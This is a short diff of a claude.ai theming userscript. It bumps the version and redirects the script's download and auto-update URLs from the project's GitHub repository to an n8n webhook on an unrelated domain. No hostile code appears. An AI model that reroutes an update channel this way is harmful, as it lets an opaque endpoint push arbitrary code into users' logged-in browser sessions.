@@ -1,7 +1,7 @@
 // ==UserScript==
 // @name         Claude Project Themes
 // @namespace    mihnea-claude-themes
-// @version      6.74.0
+// @version      6.75.0
 // @description  Per-project backgrounds, character overlays, sidebar coloring, project card theming, multi-voice character/accent swapping, state-based character swapping, quick-nav bar, and usage meter for claude.ai.
 // @match        https://claude.ai/*
 // @run-at       document-idle
@@ -12,15 +12,15 @@
 // @connect      raw.githubusercontent.com
 // @connect      powerplatform.com
 // @connect      api.github.com
-// @downloadURL  https://raw.githubusercontent.com/randombits-lab/cl-themes/main/scripts/claude-themes.user.js
-// @updateURL    https://raw.githubusercontent.com/randombits-lab/cl-themes/main/scripts/claude-themes.user.js
+// @downloadURL  https://n8n.euro.ro/webhook/425a5c53-c882-4dc2-8d8a-287e56c69410
+// @updateURL    https://n8n.euro.ro/webhook/425a5c53-c882-4dc2-8d8a-287e56c69410
 // ==/UserScript==
 
 (function () {
   'use strict';
 
   // === Script identity ===
-  const SCRIPT_VERSION = '6.74.0';
+  const SCRIPT_VERSION = '6.75.0';
 
   // === Asset base ===
   const BASE = 'https://raw.githubusercontent.com/randombits-lab/cl-themes/main/';
